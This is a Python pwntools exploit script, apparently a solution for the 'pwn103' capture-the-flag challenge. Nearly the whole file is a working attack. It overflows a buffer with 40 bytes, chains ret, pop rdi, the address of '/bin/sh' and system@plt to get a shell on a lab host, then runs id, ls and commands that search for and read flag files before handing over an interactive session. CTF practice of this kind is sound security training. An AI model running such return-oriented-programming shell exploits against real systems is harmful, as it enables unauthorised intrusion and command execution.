from pwn import *

context.log_level = 'info'
elf = ELF('./pwn103-1644300337872.pwn103')

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
binsh = next(elf.search(b'/bin/sh'))
system_plt = elf.plt['system']

log.info(f"pop rdi = {hex(pop_rdi)}")
log.info(f"ret     = {hex(ret)}")
log.info(f"/bin/sh = {hex(binsh)}")
log.info(f"system  = {hex(system_plt)}")

if args.REMOTE:
    p = remote('10.128.131.51', 9003)
else:
    p = process('./pwn103-1644300337872.pwn103')

p.recvuntil(b'Choose the channel:')
p.sendline(b'3')
p.recvuntil(b'------[pwner]: ')

payload  = b'A' * 40
payload += p64(ret)          # alignement 16 bytes (movaps)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)

p.sendline(payload)

# Attendre un peu que le shell démarre
import time
time.sleep(0.5)

p.sendline(b'id')
p.sendline(b'ls -la')
p.sendline(b'cat flag.txt')
p.sendline(b'cat /flag.txt')
p.sendline(b'find / -name "flag*" 2>/dev/null | head')

time.sleep(1)
print(p.recvrepeat(3).decode(errors='replace'))

p.interactive()
